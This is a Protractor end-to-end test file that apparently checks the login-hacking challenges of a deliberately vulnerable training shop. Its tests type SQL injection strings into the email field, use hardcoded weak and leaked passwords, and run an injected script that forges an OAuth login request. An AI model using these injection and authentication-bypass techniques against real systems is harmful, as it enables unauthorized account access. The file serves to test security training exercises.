const config = require('config')

describe('/#/login', () => {
  let email, password, rememberMeCheckbox, loginButton

  beforeEach(() => {
    browser.get('/#/login')
    email = element(by.id('email'))
    password = element(by.id('password'))
    rememberMeCheckbox = element(by.id('rememberMe-input'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', () => {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
      email.sendKeys('\' or 1=1--')
      password.sendKeys('a')
      loginButton.click()
    })

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
      email.sendKeys('admin@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login Admin'})
  })

  describe('challenge "loginJim"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
      email.sendKeys('jim@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login Jim'})
  })

  describe('challenge "loginBender"', () => {
    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
      email.sendKeys('bender@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login Bender'})
  })

  describe('challenge "adminCredentials"', () => {
    it('should be able to log in with original (weak) admin credentials', () => {
      email.sendKeys('admin@' + config.get('application.domain'))
      password.sendKeys('admin123')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Password Strength'})
  })

  describe('challenge "loginSupport"', () => {
    it('should be able to log in with original support-team credentials', () => {
      email.sendKeys('support@' + config.get('application.domain'))
      password.sendKeys('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login Support Team'})
  })

  describe('challenge "loginRapper"', () => {
    it('should be able to log in with original MC SafeSearch credentials', () => {
      email.sendKeys('mc.safesearch@' + config.get('application.domain'))
      password.sendKeys('Mr. N00dles')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login MC SafeSearch'})
  })

  describe('challenge "oauthUserPassword"', () => {
    it('should be able to log in as bjoern.kimminich@googlemail.com with base64-encoded email as password', () => {
      email.sendKeys('bjoern.kimminich@googlemail.com')
      password.sendKeys('YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==')
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login Bjoern'})
  })

  describe('challenge "loginCiso"', () => {
    it('should be able to log in as ciso@juice-sh.op by using "Remember me" in combination with (fake) OAuth login with another user', () => {
      email.sendKeys('ciso@' + config.get('application.domain'))
      password.sendKeys('wrong')
      browser.executeScript('document.getElementById("rememberMe-input").removeAttribute("class");')
      rememberMeCheckbox.click()
      loginButton.click()

      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/rest/user/login", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.setRequestHeader("X-User-Email", localStorage.getItem("email")); xhttp.send(JSON.stringify({email: "admin@juice-sh.op", password: "admin123", oauth: true}));') // eslint-disable-line

      // Deselect to clear email field for subsequent tests
      rememberMeCheckbox.click()
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login CISO'})
  })
})
